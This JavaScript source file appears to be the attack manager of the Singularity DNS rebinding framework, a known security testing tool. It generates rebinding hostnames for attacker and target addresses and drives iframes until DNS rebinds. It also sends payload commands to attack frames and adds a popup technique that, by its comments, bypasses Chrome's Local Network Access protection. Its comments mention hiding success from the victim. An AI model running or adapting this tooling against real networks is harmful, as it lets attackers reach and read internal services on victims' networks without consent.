/* Attack Management */

const Payload = () => {
    let name = null;
    let ports = [];
    return {
        getName() {
            return name;
        },
        getPorts() {
            return ports;
        },
        init(n, p) {
            name = n;
            ports = p;
        }
    }
}

const Configuration = () => {
    let type = null; // determine whether we run a manager driven or automated attack
    let automatic = null;
    let delayDOMLoad = null;
    let alertSuccess = null;
    let hideActivity = null;

    let attackPayloads = [];
    let attackHostDomain = null;
    let attackHostIPAddress = null;
    let targetHostIPAddress = null;
    let dummyPort = null;
    let indexToken = null;
    let attackPayload = null;
    let interval = null;
    let rebindingStrategy = null;
    let attackMethod = null; //'iframe', or 'fetch
    let flushDns = null;

    let rebindingSuccessFn = null;

    // Obtains URL query parameters value based on name
    // Uses https://stackoverflow.com/questions/901115/how-can-i-get-query-string-values-in-javascript
    //as URLSearchParams API not supported by all browsers
    // Returns `null` if  URL parameter `name` is not present, other its value.
    function getParameterByName(name, url) {
        if (!url) url = window.location.href;
        name = name.replace(/[\[\]]/g, '\\$&');
        let regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
            results = regex.exec(url);
        if (!results) return null;
        if (!results[2]) return '';
        return decodeURIComponent(results[2].replace(/\+/g, ' '));
    }

    return {
        init(rebindingSuccessCb) {
            // Set URL parameter `startattack` to some value 
            // to automatically start attack upon loading manager.html page
            automatic = getParameterByName('startattack');
            // Set URL parameter `delaydomload` to some value 
            // to delay the browser DOM load event
            // and prevent premature exit of headless browsers
            delayDOMLoad = getParameterByName('delaydomload');
            // Set URL parameter `alertsuccess` to "false"
            // to not present an alert box upon a successful rebinding attack.
            // This may be useful for:
            // * not informing a victim that an attack completed
            // * or to freeze a headless browser forever (unless performing a DoS attack).
            alertSuccess = getParameterByName('alertsuccess');
            type = (window.location.pathname === '/manager.html') ? 'manager' : 'automatic';
            rebindingSuccessFn = rebindingSuccessCb;
        },
        getType() {
            return type;
        },
        getDelayDOMLoad() {
            return delayDOMLoad;
        },
        getAutomatic() {
            return automatic;
        },
        getAlertSuccess() {
            return alertSuccess;
        },
        getHideActivity() {
            return hideActivity;
        },
        // Fetches manager-config.json and update Configuration object
        getManagerConfiguration() {
            let result = fetch('/manager-config.json')
                .then(function (r) {
                    return r.text()
                })
                .then(function (d) {
                    let config = JSON.parse(d);
                    for (let p of config.attackPayloads) {
                        let myConfigPayload = Payload();
                        myConfigPayload.init(p.name, p.ports);
                        attackPayloads.push(myConfigPayload);
                    }
                    attackHostDomain = config.attackHostDomain;
                    attackHostIPAddress = config.attackHostIPAddress;
                    targetHostIPAddress = config.targetHostIPAddress;
                    dummyPort = config.dummyPort;
                    indexToken = config.indexToken;
                    interval = config.interval;
                    wsProxyPort = config.wsProxyPort;
                    rebindingStrategy = config.rebindingStrategy;
                    attackMethod = config.attackMethod;
                    flushDns = config.flushDns;
                })
            return result;
        },
        getAttackPayloads() {
            return attackPayloads;
        },
        getAttackHostDomain() {
            return attackHostDomain;
        },
        getAttackHostIPAddress() {
            return attackHostIPAddress;
        },
        getTargetHostIPAddress() {
            return targetHostIPAddress;
        },
        getTargetPort() {
            return targetPort;
        },
        getDummyPort() {
            return dummyPort;
        },
        getIndexToken() {
            return indexToken;
        },
        getAttackPayload() {
            return attackPayload;
        },
        setAttackPayload(attackPayloadName) {
            attackPayload = attackPayloadName;
        },
        getInterval() {
            return interval;
        },
        setInterval(i) {
            interval = i;
        },
        getWsProxyPort() {
            return wsProxyPort;
        },
        setWsProxyPort(port) {
            wsProxyPort = port;
        },
        getRebindingStrategy() {
            return rebindingStrategy;
        },
        getFlushDns() {
            return flushDns;
        },
        setFlushDns(boolean) {
            flushDns = boolean;
        },
        getRebindingSuccessFn() {
            return rebindingSuccessFn;
        },
        getAttackMethod() {
            return attackMethod;
        },
        setAttackMethod(attackMethodName) {
            attackMethod = attackMethodName;
        },
        setManually(configObject) {
            attackHostIPAddress = configObject.attackHostIPAddress;
            attackHostDomain = configObject.attackHostDomain;
            rebindingStrategy = configObject.rebindingStrategy;
            attackMethod = configObject.attackMethod;
            flushDns = configObject.flushDns;
            interval = configObject.interval;
            wsProxyPort = configObject.wsProxyPort;
            indexToken = configObject.indexToken;
            attackPayload = configObject.attackPayload;
            hideActivity = configObject.hideActivity;
            delayDOMLoad = configObject.delayDOMLoad;
            rebindingSuccessFn = configObject.rebindingSuccessFn;

            if ((type === 'automatic') &&
                (hideActivity === false)) {
                body.style.display = 'block'
            }
            if (delayDOMLoad === null) {
                delaydomloadframe.parentNode.removeChild(delaydomloadframe);
            }
        }
    }
}

const Frame = (id, url) => {
    let fmid = id;
    let fmurl = url;
    let timer = null;
    let errorCount = 0;
    let interval = null;
    let popupName = null;
    let popupWindow = null;
    return {
        getId() {
            return fmid;
        },
        setURL(val) {
            return url = val;
        },
        getURL() {
            return fmurl;
        },
        getTimer() {
            return timer;
        },
        setTimer(val) {
            return timer = val;
        },
        getInterval() {
            return interval;
        },
        setInterval(val) {
            interval = val;
        },
        getPopupName() {
            return popupName;
        },
        setPopupName(val) {
            popupName = val;
        },
        getPopupWindow() {
            return popupWindow;
        },
        setPopupWindow(val) {
            popupWindow = val;
        },
        getErrorCount() {
            return errorCount;
        },
        incrementErrorCount() {
            return errorCount += 1;
        }
    }
};

const FrameManager = () => {
    let nextFrameIdVal = 0;
    let frames = new Map();
    let origins = new Map();
    const nextFrameId = () => {
        return nextFrameIdVal++;
    };
    const origin = (url) => {
        //Does not work in IE11. 
        //const u = new URL(url); 
        // Workaround:
        let u = document.createElement('a');
        let id = Math.random().toString();
        u.setAttribute('href', url);
        u.setAttribute('id', id);
        const o = u.port ? `${u.protocol}//${u.hostname}:${u.port}` : `${u.protocol}//${u.hostname}`;
        u.remove();
        return o;
    };
    return {
        addFrame(url) {
            const frameId = `frame-${nextFrameId().toString()}`;
            frames.set(frameId, Frame(frameId, url));
            origins.set(origin(url), frameId);
            return frameId;
        },
        removeFrame(frameId) {
            const url = frames.get(frameId).getURL();
            origins.delete(origin(url));
            return frames.delete(frameId);
        },
        updateFrame(frameId, url) {
            const oldurl = frames.get(frameId).getURL();
            const neworign = orign(url)
            origins.delete(origin(oldurl));
            origins.set(neworigin, frameId);
            frames.set(frameId, Frame(frameId, url));
        },
        frames() {
            return frames;
        },
        lastFrameId() {
            return nextFrameIdVal === 0 ? null : `frame-${nextFrameIdVal - 1}`;
        },
        frame(id) {
            return frames.get(id);
        },
        getFrameOrigin(origin) {
            return origins.get(origin);
        }
    }
};

// Toggles display of advanced settings.
function toggle() {
    if (advanced.className === 'd-block') {
        advanced.className = 'd-none'
    } else {
        advanced.className = 'd-block'
    }
}

// Requests Singularity to instantiate a new HTTP server on specified port.
function requestPort() {
    putData('/servers', {
        "Port": document.getElementById('targetport').value
    })
        .then(function (data) {
            getHTTPServersConfig().then(function (HTTPServersConfig) {
                document.getElementById('listenports').textContent = HTTPServersConfig.ports;
                document.getElementById('targetport').value = HTTPServersConfig.ports[HTTPServersConfig.ports.length - 1];
            })
        })
        .catch(error => console.error(error))
}

// Requests Singularity to provide list of HTTP servers/ports.
function getHTTPServersConfig() {
    let ports = [];
    return fetch('/servers')
        .then(function (response) {
            return response.json();
        })
        .then(function (myJsonConfig) {

            for (let e of myJsonConfig.ServerInformation) {
                ports.push(e.Port);
            }
            promise = new Promise((resolve, reject) => {
                resolve({
                    ports: ports,
                    AllowDynamicHTTPServers: myJsonConfig.AllowDynamicHTTPServers
                });
            })
            return promise;
        })
}

function putData(url, data) {
    // Default options are marked with *
    return fetch(url, {
        body: JSON.stringify(data),
        method: 'PUT',
    })
        .then(response => response.json())
}

const App = () => {
    let configuration = null;
    let fm = null;
    let hosturl = "http://s-%1.%2-%3-%4-e.%5:%6/%7";

    // Push settings from configuration object (obtained from manager-config.json) to UI.
    function populateManagerConfig() {
        payloadsElement = document.getElementById('payloads');
        for (let p of configuration.getAttackPayloads()) {
            let option = document.createElement('option');
            option.value = p.getName();
            let port = '';
            if (p.getPorts().length > 0) {
                port = ' (default port ' + p.getPorts() + ')';
            }
            option.text = p.getName() + port;
            payloadsElement.add(option, 0);
        }
        document.getElementById('attackhostdomain').value = configuration.getAttackHostDomain();
        document.getElementById('attackhostipaddress').value = configuration.getAttackHostIPAddress();
        document.getElementById('targethostipaddress').value = configuration.getTargetHostIPAddress();
        document.getElementById('dummyport').value = configuration.getDummyPort();
        document.getElementById('indextoken').value = configuration.getIndexToken();
        document.getElementById('interval').value = configuration.getInterval();
        document.getElementById('wsproxyport').value = configuration.getWsProxyPort();
        document.getElementById(configuration.getRebindingStrategy()).selected = true;
        document.getElementById('attackmethod').value = configuration.getAttackMethod();
        document.getElementById('flushdns').checked = configuration.getFlushDns();
    };


// Helper functions to allow users inputting common IP addresses instead of hexstrings, and CNAMEs

function ipToHexOrOriginal(input) {
    let ipv4Bytes = parseIPv4(input);
    if (ipv4Bytes !== null) {
      return bytesToHex(ipv4Bytes);
    }
    
    let ipv6Bytes = parseIPv6(input);
    if (ipv6Bytes !== null) {
      return bytesToHex(ipv6Bytes);
    }
    
    // Not an IPv4 or IPv6, return original string, typically a CNAME record
    return input;
  }

  function parseIPv4(str) {
    const parts = str.split('.');
    if (parts.length !== 4) {
      return null;
    }
    
    let bytes = new Uint8Array(4);
    for (let i = 0; i < 4; i++) {
      const num = Number(parts[i]);
      // Each part must be an integer within [0..255]
      if (
        !Number.isInteger(num) ||
        num < 0 ||
        num > 255 
      ) {
        return null;
      }
      bytes[i] = num;
    }
    return bytes;
  }

  function parseIPv6(str) {
    // Split on '::' first - only one such sequence is allowed
    let parts = str.split('::');
    
    if (parts.length > 2) {
      return null; // invalid: more than one '::'
    }
    
    let head = [];
    let tail = [];
    
    // Split the head by ':'
    if (parts[0] !== '') {
      head = parts[0].split(':');
    } else {
      // If parts[0] is empty, it means the address starts with '::'
      head = [];
    }
    
    // Split the tail by ':'
    if (parts.length === 2 && parts[1] !== '') {
      tail = parts[1].split(':');
    } else if (parts.length === 2 && parts[1] === '') {
      // If parts[1] is empty, it means the address ends with '::'
      tail = [];
    }
    
    // Now we know the total number of blocks we have
    // The full IPv6 must have 8 groups (16 bytes total)
    let missingGroups = 8 - (head.length + tail.length);
    if (missingGroups < 0) {
      // Means we have more than 8 groups in total
      return null;
    }
    
    // Build the full array of groups in hex
    let groups = [];
    
    // Validate and push the head
    for (let h of head) {
      if (!isValidHextet(h)) {
        return null;
      }
      groups.push(h);
    }
    
    // Insert the zero-groups for '::'
    for (let i = 0; i < missingGroups; i++) {
      groups.push('0');
    }
    
    // Validate and push the tail
    for (let t of tail) {
      if (!isValidHextet(t)) {
        return null;
      }
      groups.push(t);
    }
    
    if (groups.length !== 8) {
      return null; // sanity check
    }
    
    // Convert each group from hex into two bytes
    let bytes = new Uint8Array(16);
    for (let i = 0; i < 8; i++) {
      let val = parseInt(groups[i], 16);
      // High byte
      bytes[i * 2] = (val >> 8) & 0xff;
      // Low byte
      bytes[i * 2 + 1] = val & 0xff;
    }
    
    return bytes;
  }

  function isValidHextet(str) {
    if (str.length === 0 || str.length > 4) {
      return false;
    }
    // Check valid hex
    return /^[0-9A-Fa-f]+$/.test(str);
  }

  function bytesToHex(bytes) {
    return Array.from(bytes)
      .map(b => b.toString(16).padStart(2, '0'))
      .join('');
  }

    function generateAttackUrl(targetHostIPAddress, targetPort, forceDnsRebindingStrategyName) {
        return hosturl
            .replace("%1", ipToHexOrOriginal(configuration.getAttackHostIPAddress()))
            .replace("%2", ipToHexOrOriginal(targetHostIPAddress)) // replace(/-/g, '--'))
            .replace("%3", Math.floor(Math.random() * 2 ** 32))
            .replace("%4", forceDnsRebindingStrategyName === null ?
                configuration.getRebindingStrategy() : forceDnsRebindingStrategyName)
            .replace("%5", configuration.getAttackHostDomain())
            .replace("%6", targetPort)
            .replace("%7", 'soopayload.html' + '?rnd=' + Math.random())
    };

    function reloadAttackFrame(frame) {
        console.log(`reloadAttackFrame: ${frame.getURL()}`);
        document.getElementById(frame.getId()).src = frame.getURL();
    };

    return {
        getFrameManager() {
            return fm;
        },
        getConfiguration() {
            return configuration;
        },

        attackTarget(targetHostIPAddress, targetPort, optimizeForSpeed) {
            let self = this;

            let payload = app.getConfiguration().getRebindingStrategy();
            let interval = self.getConfiguration().getInterval();

            if (optimizeForSpeed === true) {
                // let's try some rebinding strategy optimizations 
                // Rebinding in 3s!
                if (targetHostIPAddress === '0.0.0.0' && isUnixy() === true) {
                    payload = 'ma';
                    interval = '1';

                } else if (targetHostIPAddress === '127.0.0.1' && isUnixy() === false) {
                    payload = 'ma';
                    interval = '1';
                }
            }

            let fid = self.getFrameManager().addFrame(generateAttackUrl(targetHostIPAddress, targetPort, payload));
            self.getFrameManager().frame(fid).setInterval(interval);
            // Unique popup name per target. No user gesture is available on
            // this (scan/autoattack) path, so window.open() in the attack
            // frame will normally be blocked and fall back to its button;
            // a unique name at least prevents concurrent frames from
            // reclaiming each other's popup.
            self.getFrameManager().frame(fid).setPopupName(`soo-popup-${fid}`);

            self.addFrameToDOM(self.getFrameManager().frame(fid));
            self.getFrameManager().frame(fid).setTimer(setInterval((() => {
                self.reloadAttackFrame(self.getFrameManager().frame(fid))
            }), parseInt(interval) * 1000));

        },
        init(rebindingSuccessCb) {
            let self = this;

            fm = FrameManager();

            // Configuration
            configuration = Configuration();
            // Initialize defaults settings and settings passed from URL query.
            configuration.init(rebindingSuccessCb);

            // Message handler between Manager and attack frames
            window.addEventListener('message', self.receiveMessage, false);

            if (configuration.getType() === 'manager') {

                // Singularity HTTP server settings initialization
                document.addEventListener('DOMContentLoaded', function (event) {
                    let HTTPServersConfig = getHTTPServersConfig().then(function (HTTPServersConfig) {
                        document.getElementById('listenports').textContent = HTTPServersConfig.ports;
                        document.getElementById('targetport').value = HTTPServersConfig.ports[HTTPServersConfig.ports.length - 1];
                        document.getElementById('requestport').disabled = !HTTPServersConfig.AllowDynamicHTTPServers;
                    });

                    // Fetch Manager configuration from Singularity HTTP server
                    let payloadsAndTargets = configuration.getManagerConfiguration();

                    // Once we have our HTTP servers config, payloads and targets
                    Promise.all([HTTPServersConfig, payloadsAndTargets]).then(function (values) {
                        populateManagerConfig();
                        //start attack on page load if ?startattack is set     
                        if (configuration.getAutomatic() !== null) {
                            self.begin();
                        }
                    });
                });
            };
        },
        addFrameToDOM(frame) {
            console.log(`addFrameToDOM: ${frame.getURL()}`);
            let f = document.createElement('iframe');
            f.src = frame.getURL();
            f.setAttribute('id', frame.getId());
            //f.setAttribute('style', "display: none");
            document.getElementById('attackframes').appendChild(f);
        },

        // Set src of attackframe
        // thus loading the attack payload before rebinding
        // and accessing the target after rebinding.
        reloadAttackFrame(frame) {
            reloadAttackFrame(frame);
        },

        // communication handler between manager and attack iframe.
        receiveMessage(msg) {
            console.log('Message received from: ', msg.origin, msg.data.status);

            const fid = fm.getFrameOrigin(msg.origin)
            // If we don't have a frame ID for this message origin, dismiss message.
            if (fid === undefined) {
                return;
            };

            if (msg.data.status === 'start') {
                console.log(`Iframe reports that attack has started: ${msg.origin}`);
                clearInterval(fm.frame(fid).getTimer());
                msg.source.postMessage({
                    cmd: 'payload',
                    param: configuration.getAttackPayload()
                }, "*");
                msg.source.postMessage({
                    cmd: 'interval',
                    param: fm.frame(fid).getInterval() ? fm.frame(fid).getInterval() : configuration.getInterval()
                }, "*");
                msg.source.postMessage({
                    cmd: 'wsproxyport',
                    param: configuration.getWsProxyPort()
                }, "*");
                msg.source.postMessage({
                    cmd: 'indextoken',
                    param: configuration.getIndexToken()
                }, "*");
                msg.source.postMessage({
                    cmd: 'flushdns',
                    param: { hostname: window.location.hostname, flushDns: configuration.getFlushDns() }
                }, "*");
                configuration.setFlushDns(false); // so it run only once in autoattack.
                if (configuration.getAttackMethod() === 'fetch') {
                msg.source.postMessage({
                    cmd: 'startFetch',
                    param: null
                }, "*");
                } else if (configuration.getAttackMethod() === 'popup') {
                    const placeholder = fm.frame(fid).getPopupWindow();
                    msg.source.postMessage({
                        cmd: 'startPopup',
                        param: {
                            popupName: fm.frame(fid).getPopupName(),
                            placeholderOpened: !!(placeholder && !placeholder.closed)
                        }
                    }, "*");
                } else {
                    msg.source.postMessage({
                        cmd: 'startReloadChildFrame',
                        param: null
                    }, "*");
                }
            };

            if (msg.data.status === 'success') {
                configuration.getRebindingSuccessFn()(msg);
                msg.source.postMessage({
                    cmd: 'stop'
                }, "*");
            };

            // The attack frame has detected the DNS rebinding and asks us
            // to navigate the placeholder popup we opened on the user's
            // click. We hold a valid handle in this document, and setting a
            // window's location is allowed cross-origin, so this needs no
            // user activation anywhere. After this navigation the popup is
            // on the attack frame's origin and the frame can reclaim it.
            if (msg.data.status === 'navigatePopup') {
                const frame = fm.frame(fid);
                const placeholder = frame.getPopupWindow();
                const a = document.createElement('a');
                a.href = frame.getURL();
                const expectedOrigin = `${a.protocol}//${a.host}`;
                a.remove();
                if (placeholder && !placeholder.closed &&
                    typeof msg.data.url === 'string' && msg.data.url.startsWith(expectedOrigin + '/')) {
                    console.log(`Navigating placeholder popup '${frame.getPopupName()}' to ${msg.data.url}`);
                    placeholder.location.href = msg.data.url;
                } else {
                    console.log(`Cannot navigate placeholder popup for ${msg.origin} (closed, missing, or unexpected URL)`);
                    msg.source.postMessage({ cmd: 'popupNavigationFailed', param: null }, '*');
                }
            }

            if (msg.data.status === 'popupBlocked') {
                console.log(`Popup blocked for ${msg.origin}. Allow popups for this site, or click the button shown in the attack frame, then restart the attack.`);
            }

            if (msg.data.status === 'requiresHttpAuthentication') {
                document.getElementById(fid).contentWindow.postMessage({
                    cmd: 'stop'
                }, "*");
                console.log(`This resource requires HTTP authentication. Cannot access without user noticing: ${msg.origin}`);
            }

            // Possibly a firewalled or closed port. Possibly a non-HTTP service.
            if (msg.data.status === 'error') {
                fm.frame(fid).incrementErrorCount();
                console.log(`error: ${msg.origin}`);

                if (fm.frame(fid).getErrorCount() === 5) {
                    document.getElementById(fid).contentWindow.postMessage({
                        cmd: 'stop'
                    }, "*");
                    console.log(`Too many errors, stopping: ${msg.origin}`);
                }
            }
        },
        // Starts attack
        begin() {
            let self = this;

            const UiInterval = document.getElementById('interval').value;
            configuration.setInterval(UiInterval);

            const UiFlushDns = document.getElementById('flushdns').checked;
            configuration.setFlushDns(UiFlushDns);

            const UiAttackPayloadName = document.getElementById('payloads').value;
            configuration.setAttackPayload(UiAttackPayloadName);

            const UIAttackMethod = document.getElementById('attackmethod').value;
            configuration.setAttackMethod (UIAttackMethod);

            // Popup attack method (technique credit:
            // https://issues.chromium.org/issues/475274565 -- Local Network
            // Access bypass via a new window / top-level navigation with
            // DNS rebinding). window.open() requires transient user
            // activation, which does not propagate from this manager page
            // into the (cross-origin) attack iframe via postMessage, so the
            // attack frame's window.open() gets blocked. Instead, open a
            // named placeholder popup *synchronously* here, inside the
            // "Start Attack" click handler, where activation is valid
            // (Chrome/Firefox allow one popup per user gesture). We keep
            // the handle in this document: the attack frame generally
            // cannot retrieve a handle to this cross-origin placeholder by
            // name, so instead it probes for the rebinding and asks us (via
            // postMessage) to navigate the placeholder for it -- setting a
            // window's location is allowed cross-origin. Once navigated to
            // the rebinding hostname, the popup shares the attack frame's
            // origin and the frame can reclaim and read it.
            // If begin() was invoked without a gesture (?startattack), this
            // returns null and the attack frame falls back to asking for a
            // click on its own button.
            let popupName = null;
            let popupPlaceholder = null;
            if (UIAttackMethod === 'popup') {
                popupName = `soo-popup-${Math.floor(Math.random() * 2 ** 32)}`;
                const placeholder = window.open('about:blank', popupName, 'width=900,height=700');
                popupPlaceholder = placeholder;
                if (placeholder) {
                    try {
                        placeholder.document.title = 'Singularity popup attack';
                        placeholder.document.body.innerHTML =
                            '<p>Singularity popup attack window. Do not close: this window will be navigated to the target once DNS has rebound.</p>';
                    } catch (e) { /* placeholder content is best-effort */ }
                    console.log(`Opened placeholder popup '${popupName}' for the popup attack.`);
                } else {
                    console.log('Placeholder popup blocked (no user gesture?). The attack frame will ask for a click instead.');
                }
            }

            const UiAttackWsProxyPort = document.getElementById('wsproxyport').value;
            configuration.setWsProxyPort(UiAttackWsProxyPort);


            let fid = fm.addFrame(hosturl
                .replace("%1", ipToHexOrOriginal(document.getElementById('attackhostipaddress').value))
                .replace("%2", ipToHexOrOriginal(document.getElementById('targethostipaddress').value.replace(/-/g, '--')))
                .replace("%3", Math.floor(Math.random() * 2 ** 32))
                .replace("%4", document.getElementById('rebindingStrategy').value)
                .replace("%5", document.getElementById('attackhostdomain').value)
                .replace("%6", document.getElementById('targetport').value)
                //.replace("%7", document.getElementById("payloads").value) + "?rnd=" + Math.random());
                .replace("%7", 'soopayload.html') + '?rnd=' + Math.random());

            fm.frame(fid).setPopupName(popupName);
            fm.frame(fid).setPopupWindow(popupPlaceholder);

            self.addFrameToDOM(fm.frame(fid));

            message.className = 'd-block';
            start.disabled = true;

            fm.frame(fid).setTimer(setInterval((() => {
                self.reloadAttackFrame(fm.frame(fid))
            }), parseInt(UiInterval) * 1000));
        }
    }
}

function isUnixy() {
    return !(navigator.platform.includes('Win'));
}

function rebindingSuccessCb(msg) {
    console.log(`Iframe reports attack successful for ${msg.origin}\n${msg.data.response}`);
    if ((app.getConfiguration().getAlertSuccess() !== 'false') &&
        (app.getConfiguration().getType() === 'manager') &&
        (document.getElementById('payloads').value !== 'Hook and Control')) {
        alert('Attack Successful from ' + document.domain + '.\n'
            + 'Origin: \n' + msg.origin + '.\n'
            + 'Target home page contents:\n' + msg.data.response);
    }
}

// Start
const app = App();
app.init(rebindingSuccessCb);

